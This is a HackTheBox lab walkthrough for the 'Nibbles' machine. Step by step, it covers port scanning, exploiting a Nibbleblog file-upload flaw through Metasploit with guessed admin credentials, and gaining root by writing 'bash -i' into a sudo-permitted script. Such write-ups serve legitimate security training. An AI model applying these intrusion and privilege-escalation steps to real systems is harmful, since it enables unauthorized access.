HTB 6. Nibbles

1. Port 22 and 80 open from `nmap -A -T4 -p- 10.10.10.75`, typically 80 is for the exploit and 22 is used later. SSH is usually not the exploit. 
2. `searchsploit apache 2.4`
3. Going to `10.10.10.75` shows "Hello World" only
4. Viewing source shows `10.10.10.75/nibbleblog/` on nibbleblog platform
5. `searchsploit nibble` finds Nibbleblog 4.0.3 arbitrary file upload and remote code execution
6. In metasploit `use exploit/multi/http/nibbleblog_file_upload` and `info` shows we need to be authenticated
7. `dirbuster` to find login pages
8. Could potentially use Burp Suite to brute force usernames and password or just bruteforce password with admin as username. Potentially use `cewl` on blog posts to create password list. 
9. Credentials are `admin:nibbles`, guessed by site name.
10. Set parameters in metasploit to the username, password, rhosts, and `targeturi=/nibbleblog`.
11. This works because of the `My Image` plugin that allows any file to be uploaded (no whitelisting is being done)
12. `sysinfo` shows `4.4.0 ubuntu` and `gituid` show `nibbler (1001)`
13. Searching for priv_esc
	```
	shell
	cd /home/nibbler
	ls -la
	cat user.txt
	history
	cat .bash_history
	sudo -l
	```
14. `sudo -l` reveals `~/personal/stuff/monitor.sh` can run as root without a password
15. This folder does not exist so we can create a shell script in that location.
16. `personal.zip` exists, potentially try and crack it
17. `uname -a` to print entire OS running and potentially search for exploits for the general OS
18. [`LinEnum.sh`](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and [`linuxprivchecker.py`](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py) are great scripts for enumerating linux.
19. `echo "bash -i" > monitor.sh` and `chmod +x monitor.sh`
20. `sudo /home/nibbler/personal/stuff/monitor.sh`
21. cat `/root/root.txt`


